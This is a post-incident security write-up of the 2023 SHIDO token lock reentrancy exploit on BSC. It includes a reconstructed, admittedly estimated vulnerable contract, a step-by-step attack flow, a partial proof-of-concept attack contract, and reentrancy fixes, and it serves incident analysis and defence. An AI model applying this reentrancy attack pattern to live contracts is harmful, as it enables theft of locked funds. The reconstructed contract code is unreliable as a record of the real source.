# SHIDO — Token Lock Reentrancy Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2023-06-22 |
| **Protocol** | SHIDO Token |
| **Chain** | BSC |
| **Loss** | ~230K USD (~977 WBNB) |
| **Attacker** | [0x69810917...](https://bscscan.com/address/0x69810917928b80636178b1bb011c746efe61770d) |
| **Attack Contract** | [0xcdb3d057...](https://bscscan.com/address/0xcdb3d057ca0cfdf630baf3f90e9045ddeb9ea4cc) |
| **Attack Tx** | [0x72f8dd2b...](https://bscscan.com/tx/0x72f8dd2bcfe2c9fbf0d933678170417802ac8a0d8995ff9a56bfbabe3aa712d6) |
| **Vulnerable Contract** | [0xa963ee46...](https://bscscan.com/address/0xa963ee460cf4b474c35ded8fff91c4ec011fb640) |
| **Root Cause** | CEI pattern violation in ShidoLock contract's `lockTokens()`/`claimTokens()` enables reentrancy |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/SHIDO_exp.sol) |

---
## 1. Vulnerability Overview

The ShidoLock contract of the SHIDO token provides functionality to lock tokens and subsequently claim them. The `lockTokens()` function has a CEI violation structure where it executes an external token transfer before updating state, allowing an attacker to reenter via SHIDO token transfer callbacks. Additional profit was gained through fee-free liquidity addition via FeeFreeRouter.

## 2. Vulnerable Code Analysis

```solidity
// ❌ ShidoLock: CEI pattern violation
interface IShidoLock {
    function lockTokens() external;
    function claimTokens() external;
}

// Vulnerable lockTokens implementation (estimated)
function lockTokens() external {
    uint256 amount = shido.balanceOf(msg.sender);
    // ❌ External call first — reentrancy possible via callback during transfer
    shido.transferFrom(msg.sender, address(this), amount);
    // ❌ State update after
    locked[msg.sender] += amount;
    lockTime[msg.sender] = block.timestamp + LOCK_PERIOD;
}

// ❌ claimTokens: double-claiming possible via reentrancy
function claimTokens() external {
    require(block.timestamp >= lockTime[msg.sender], "Too early");
    uint256 amount = locked[msg.sender];
    // ❌ External call before state reset
    shido.transfer(msg.sender, amount);
    locked[msg.sender] = 0;  // ❌ Too late
}
```

```solidity
// ✅ Fix: CEI pattern + ReentrancyGuard
function claimTokens() external nonReentrant {
    uint256 amount = locked[msg.sender];
    require(amount > 0, "Nothing to claim");
    // ✅ State reset first (Effects)
    locked[msg.sender] = 0;
    lockTime[msg.sender] = 0;
    // ✅ External call after (Interactions)
    shido.transfer(msg.sender, amount);
}
```

### On-chain Source Code

Source: Bytecode decompilation

```solidity
// Root cause: CEI pattern violation in ShidoLock contract's `lockTokens()`/`claimTokens()` enables reentrancy
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
┌──────────────────────────────────────────┐
│  1. Borrow WBNB via DODO flash loan      │
└──────────────────────┬───────────────────┘
                       ▼
┌──────────────────────────────────────────┐
│  2. Swap WBNB → SHIDO                   │
└──────────────────────┬───────────────────┘
                       ▼
┌──────────────────────────────────────────┐
│  3. Call ShidoLock.lockTokens()          │
│     Reenter via SHIDO transfer callback  │
│     → lockTokens() called repeatedly     │
└──────────────────────┬───────────────────┘
                       ▼
┌──────────────────────────────────────────┐
│  4. Double-claim via claimTokens()       │
└──────────────────────┬───────────────────┘
                       ▼
┌──────────────────────────────────────────┐
│  5. Drain LP liquidity via FeeFreeRouter │
│  6. Sell SHIDO → WBNB + repay flash loan │
└──────────────────────────────────────────┘
```

## 4. PoC Code

```solidity
// Attack contract — reenter upon receiving SHIDO transfer
function onTokenReceived(address, uint256 amount) external {
    if (reentrancyCount < MAX_REENTER) {
        reentrancyCount++;
        // ❌ Reenter before state update
        shidoLock.lockTokens();
    }
}

function attack() external {
    // 1. Buy SHIDO then call lockTokens for the first time
    shidoLock.lockTokens();

    // 2. Double-claim via claimTokens (locked amount multiplied)
    shidoLock.claimTokens();

    // 3. Drain additional liquidity via FeeFreeRouter
    feeFreeRouter.addLiquidityETH{value: 0}(address(shido), ...);
}
```

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | CEI pattern violation reentrancy | CRITICAL | CWE-841 | 01_reentrancy.md |
| V-02 | lockTokens duplicate execution | HIGH | CWE-362 | 01_reentrancy.md |
| V-03 | FeeFreeRouter vulnerable integration | MEDIUM | CWE-284 | 07_token_integration.md |

## 6. Remediation Recommendations

### Immediate Action
```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

function claimTokens() external nonReentrant {
    uint256 amount = locked[msg.sender];
    locked[msg.sender] = 0;  // ✅ Effects first
    shido.transfer(msg.sender, amount);  // ✅ Interactions after
}
```

## 7. Lessons Learned

Token lock/vesting contracts must always apply `nonReentrant` and the CEI pattern, as token transfers can trigger callbacks. SHIDO_exp2 is a detailed analysis of the same attack, with a confirmed total loss of 977 WBNB.